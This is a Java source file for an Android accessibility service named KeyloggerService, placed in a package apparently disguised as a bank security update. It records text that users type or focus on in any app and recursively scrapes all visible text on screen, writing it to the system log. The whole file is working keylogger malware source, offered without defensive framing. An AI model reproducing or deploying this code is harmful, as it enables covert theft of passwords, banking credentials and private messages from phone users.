package com.bank.security.update;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class KeyloggerService extends AccessibilityService {
    private static final String TAG = "KeyloggerService";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        CharSequence packageName = event.getPackageName();

        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            List<CharSequence> textList = event.getText();
            for (CharSequence txt : textList) {
                Log.d(TAG, "Captured user input on " + packageName + ": " + txt.toString());
            }

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                scrapeNodeText(root);
            }
        }
    }

    private void scrapeNodeText(AccessibilityNodeInfo node) {
        if (node == null) return;
        if (node.getText() != null) {
            String val = node.getText().toString();
            if (val.length() > 0) {
                Log.d(TAG, "Scraped node text: " + val);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            scrapeNodeText(node.getChild(i));
        }
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        setServiceInfo(info);
    }
}
